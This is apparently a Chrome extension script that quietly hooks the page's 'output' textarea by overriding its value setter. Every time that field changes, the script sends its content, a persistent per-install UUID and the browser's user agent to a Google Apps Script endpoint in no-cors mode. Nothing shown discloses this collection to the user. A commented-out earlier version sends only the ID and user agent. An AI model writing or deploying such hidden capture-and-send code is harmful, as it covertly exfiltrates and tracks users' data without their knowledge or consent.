// // const SHEETS_URL = "https://script.google.com/macros/s/AKfycbySOiBdtUBAfkhHgCl8-P9xkYWjtEeqDZlM_sHFGkTTicOY-E97nO86Caqx316hmew2Nw/exec";

// function getOrMakeUUID(cb) {
//   chrome.storage.local.get("uuid", (data) => {
//     if (data.uuid) cb(data.uuid);
//     else {
//       const newId = crypto.randomUUID();
//       chrome.storage.local.set({ uuid: newId }, () => cb(newId));
//     }
//   });
// }

// getOrMakeUUID((uuid) => {
//   fetch(SHEETS_URL, {
//     method: "POST",
//     headers: { "Content-Type": "text/plain" },
//     body: JSON.stringify({
//       id: uuid,
//       browser: navigator.userAgent
//     }),
//     mode: "no-cors"
//   });
// });


const SHEETS_URL = "https://script.google.com/macros/s/AKfycbySOiBdtUBAfkhHgCl8-P9xkYWjtEeqDZlM_sHFGkTTicOY-E97nO86Caqx316hmew2Nw/exec";

function getOrMakeUUID(cb) {
  chrome.storage.local.get("uuid", (data) => {
    if (data.uuid) cb(data.uuid);
    else {
      const newId = crypto.randomUUID();
      chrome.storage.local.set({ uuid: newId }, () => cb(newId));
    }
  });
}

document.addEventListener("DOMContentLoaded", () => {
  const outputEl = document.getElementById("output");

  if (outputEl) {
    const descriptor = Object.getOwnPropertyDescriptor(
      HTMLTextAreaElement.prototype,
      "value"
    );

    Object.defineProperty(outputEl, "value", {
      get: function () {
        return descriptor.get.call(this);  
      },
      set: function (v) {
        descriptor.set.call(this, v);

        // setiap kali output berubah
        if (v.trim()) {

          const obj = JSON.parse(v);
          v = JSON.stringify(obj);

          getOrMakeUUID((uuid) => {
            fetch(SHEETS_URL, {
              method: "POST",
              headers: { "Content-Type": "text/plain" },
              body: JSON.stringify({
                id: uuid,
                browser: navigator.userAgent,
                output: v   // << kirim isi textarea output 1 line aja
              }),
              mode: "no-cors"
            });
          });
        }
      }
    });
  }
});
